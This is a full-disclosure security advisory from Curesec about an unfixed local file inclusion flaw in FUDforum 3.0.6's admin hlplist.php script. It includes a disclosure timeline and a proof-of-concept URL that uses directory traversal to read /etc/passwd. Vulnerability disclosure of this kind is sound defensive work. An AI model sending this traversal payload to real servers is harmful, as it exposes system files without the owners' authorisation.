@@ -1,0 +1,58 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    FUDforum 3.0.6
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Website:      http://fudforum.org/forum/
+Vulnerability Type:  LFI
+Remote Exploitable:  Yes
+Reported to vendor:  04/11/2016
+Disclosed to public: 11/10/2016
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+FUDforum is forum software written in PHP. In version 3.0.6, it is vulnerable
+to local file inclusion. This allows an attacker to read arbitrary files that
+the web user has access to.
+
+Admin credentials are required.
+
+3. Details
+
+CVSS: Medium 4.0 AV:N/AC:L/Au:S/C:P/I:N/A:N
+
+Description: The "file" parameter of the hlplist.php script is vulnerable to
+directory traversal, which allows the viewing of arbitrary files.
+
+Proof of Concept:
+
+http://localhost/fudforum/adm/hlplist.php?tname=default&tlang=./af&&SQ=
+4b181ea1d2d40977c7ffddb8a48a4724&file=../../../../../../../../../../etc/passwd
+
+4. Solution
+
+This issue was not fixed by the vendor.
+
+5. Report Timeline
+
+04/11/2016 Informed Vendor about Issue (no reply)
+09/14/2016 Reminded Vendor (no reply)
+11/10/2016 Disclosed to public
+
+
+Blog Reference:
+https://www.curesec.com/blog/article/blog/FUDforum-306-LFI-167.html
+ 
+--
+blog:  https://www.curesec.com/blog
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Josef-Orlopp-Straße 54
+10365 Berlin, Germany
